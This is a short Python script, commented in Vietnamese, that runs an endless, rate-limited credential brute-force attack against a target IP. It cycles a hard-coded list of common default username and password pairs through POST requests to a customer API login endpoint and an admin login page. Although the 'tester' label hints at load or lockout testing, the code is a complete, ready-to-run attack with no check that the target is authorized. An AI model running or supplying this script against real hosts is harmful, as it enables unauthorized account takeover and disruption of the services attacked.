import requests
import random
import sys
import time

API_LOGIN = "/api/customers/login/"
ADMIN_LOGIN = "/admin/login/"

HEADERS = {
    "User-Agent": "BruteforceTester/Soft"
}

PAYLOADS = [
    {"username": "admin", "password": "123456"},
    {"username": "admin", "password": "admin"},
    {"username": "test", "password": "123"},
    {"username": "root", "password": "root"},
    {"username": "user", "password": "password"},
    {"username": "administrator", "password": "admin123"},
    {"username": "guest", "password": "guest"},
    {"username": "admin", "password": "password1"},
    {"username": "admin", "password": "letmein"},
    {"username": "user", "password": "qwerty"},
    {"username": "testuser", "password": "testpass"},
]

def soft_attack(base_url, rps=10):
    """
    rps = request per second (mỗi giây)
    mỗi vòng gửi 2 request: API + ADMIN
    Nghĩa là mỗi vòng ngủ (1 / (rps/2)) giây
    """
    api_url = base_url + API_LOGIN
    admin_url = base_url + ADMIN_LOGIN

    session = requests.Session()
    interval = 1 / (rps / 2)   # vì mỗi cycle gửi 2 request

    print(f"\n=== SOFT BRUTEFORCE STARTED ===")
    print(f"Base URL: {base_url}")
    print(f"Target rate: ~{rps} requests/second")
    print("Nhấn CTRL + C để dừng.\n")

    count = 0
    try:
        while True:
            payload = random.choice(PAYLOADS)

            try:
                session.post(api_url, data=payload, headers=HEADERS, timeout=1)
                session.post(admin_url, data=payload, headers=HEADERS, timeout=1)
            except:
                pass

            count += 2

            # in mỗi 2 giây để tránh spam console
            if count % 20 == 0:
                print(f"[INFO] Sent {count} requests...")

            time.sleep(interval)

    except KeyboardInterrupt:
        print(f"\n=== STOPPED BY USER ===")
        print(f"Tổng request đã gửi: {count}\n")


def main():
    if len(sys.argv) < 2:
        print("Usage: python bruteforce_soft.py <IP>")
        sys.exit(1)

    ip = sys.argv[1]
    base_url = f"http://{ip}"

    # chạy khoảng 10 request/giây
    soft_attack(base_url, rps=10)


if __name__ == "__main__":
    main()
